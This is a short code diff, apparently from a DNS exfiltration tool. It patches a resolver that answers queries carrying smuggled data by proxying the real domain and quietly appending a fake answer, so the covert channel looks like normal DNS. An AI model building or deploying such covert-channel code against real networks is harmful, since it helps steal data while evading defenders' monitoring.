@@ -60,15 +60,23 @@ class InterceptAppendResolver(InterceptDefaultResolver):
             # We answered the question without an error, so we are exfiltrating successfully
             # When this happens, we want to proxy back the real domain name to get back real data
             # with our fake response inconspicuously at the end.
-            real_domain_name = '.'.join(str(qname).split('.')[-2:])
-            real_request = dnslib.DNSRecord
+            real_domain_name = '.'.join(str(qname).split('.')[-3:])
+            real_request = dnslib.DNSRecord()
             real_request.add_question(dnslib.DNSQuestion(real_domain_name, qtype))
-            reply = self.interceptor.resolve(real_request, handler)
-            reply.add_answer(answer)
+            real_reply = self.interceptor.resolve(real_request, handler)
+
+            # Build a new record which has the ID and question of the original question
+            # and the answers from both real and fake sources.
+            return_reply = dnslib.DNSRecord()
+            return_reply.header.id = request.header.id
+            return_reply.add_question(request.q)
+            return_reply.add_answer(real_reply.a)
+            return_reply.add_answer(answer)
         except:
-            reply = self.interceptor.resolve(request, handler)
-            pass
-        return reply
+            # if we are here, we did not exfiltrate data.
+            # Lets assume it's a real domain and just return a valid response
+            return_reply = self.interceptor.resolve(request, handler)
+        return return_reply
 
 
 def start_server(resolver):
